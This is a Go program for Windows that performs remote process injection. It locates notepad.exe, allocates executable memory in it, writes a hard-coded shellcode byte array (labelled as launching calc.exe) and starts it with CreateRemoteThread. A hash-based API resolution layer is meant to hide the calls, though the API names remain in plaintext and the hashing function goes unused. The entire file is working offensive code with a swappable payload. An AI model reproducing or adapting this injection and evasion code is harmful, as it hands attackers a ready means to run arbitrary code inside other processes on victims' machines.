// +build windows

package main

import (
    "fmt"
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
    "strings"
    "hash/crc32"
)

// CRC32-based hashing for API names
func hashAPI(name string) uint32 {
    return crc32.ChecksumIEEE([]byte(name))
}

// Precomputed API hashes
var apiHashes = map[uint32]string{
    0x75c66e5b: "OpenProcess",
    0xe553a458: "VirtualAllocEx",
    0xc34ecb8e: "WriteProcessMemory",
    0x1ff9279f: "CreateRemoteThread",
    0x409c8e63: "CloseHandle",
}

// Resolve an API function by hash
func resolveAPI(dll *syscall.LazyDLL, hash uint32) *syscall.LazyProc {
    for h, name := range apiHashes {
        if h == hash {
            return dll.NewProc(name)
        }
    }
    return nil
}

const (
    PROCESS_ALL_ACCESS      = 0x1F0FFF
    MEM_COMMIT              = 0x1000
    MEM_RESERVE             = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")

    // Resolve APIs by hash
    OpenProcess := resolveAPI(kernel32, 0x75c66e5b)
    VirtualAllocEx := resolveAPI(kernel32, 0xe553a458)
    WriteProcessMemory := resolveAPI(kernel32, 0xc34ecb8e)
    CreateRemoteThread := resolveAPI(kernel32, 0x1ff9279f)
    CloseHandle := resolveAPI(kernel32, 0x409c8e63)

    if OpenProcess == nil || VirtualAllocEx == nil || WriteProcessMemory == nil || CreateRemoteThread == nil || CloseHandle == nil {
        fmt.Println("Failed to resolve one or more API functions")
        return
    }

    // Basic shellcode: calc.exe (64-bit Windows)
    shellcode := []byte{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,
0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,
0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,
0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,
0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,
0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,
0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,
0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,
0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,
0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,
0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,
0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,
0x78,0x65,0x00};


    pid, err := findProcessID("notepad.exe")
    if err != nil {
        fmt.Println("Failed to find process:", err)
        return
    }
    fmt.Printf("Found notepad.exe with PID %d\n", pid)

    processHandle, _, err := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
    if processHandle == 0 {
        fmt.Println("Failed to open target process:", err)
        return
    }
    defer CloseHandle.Call(processHandle)

    remoteAddr, _, err := VirtualAllocEx.Call(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if remoteAddr == 0 {
        fmt.Println("Memory allocation error:", err)
        return
    }

    var written uintptr
    ret, _, err := WriteProcessMemory.Call(processHandle, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
    if ret == 0 {
        fmt.Println("Failed to write shellcode to target process:", err)
        return
    }

    threadHandle, _, err := CreateRemoteThread.Call(processHandle, 0, 0, remoteAddr, 0, 0, 0)
    if threadHandle == 0 {
        fmt.Println("Failed to create remote thread:", err)
        return
    }
    defer CloseHandle.Call(threadHandle)

    fmt.Println("Shellcode executed successfully.")
}

func findProcessID(processName string) (uint32, error) {
    var processEntry windows.ProcessEntry32
    processEntry.Size = uint32(unsafe.Sizeof(processEntry))

    snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
    if err != nil {
        return 0, err
    }
    defer windows.CloseHandle(snapshot)

    if err := windows.Process32First(snapshot, &processEntry); err != nil {
        return 0, err
    }

    for {
        if strings.EqualFold(windows.UTF16ToString(processEntry.ExeFile[:]), processName) {
            return processEntry.ProcessID, nil
        }
        if err := windows.Process32Next(snapshot, &processEntry); err != nil {
            break
        }
    }
    return 0, fmt.Errorf("process not found")
}

